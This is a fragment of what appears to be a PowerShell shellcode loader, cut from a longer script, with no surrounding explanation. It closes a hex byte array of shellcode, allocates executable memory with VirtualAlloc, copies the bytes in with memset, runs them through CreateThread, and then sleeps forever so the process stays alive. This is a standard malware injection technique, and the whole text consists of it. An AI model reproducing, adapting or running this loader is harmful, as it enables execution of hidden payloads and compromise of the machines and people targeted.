0x30,0xe0,0xeb,0xe8,0xec,0x94,0xa0,0x7c,0x0f,0xcd,0x15,0xd6,0x67,0xf3,0x40,0x10,0x28,0x0c,0xa7,0xa0,0x14,0xdb,0x81,0xd6,0x74,0xdf;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

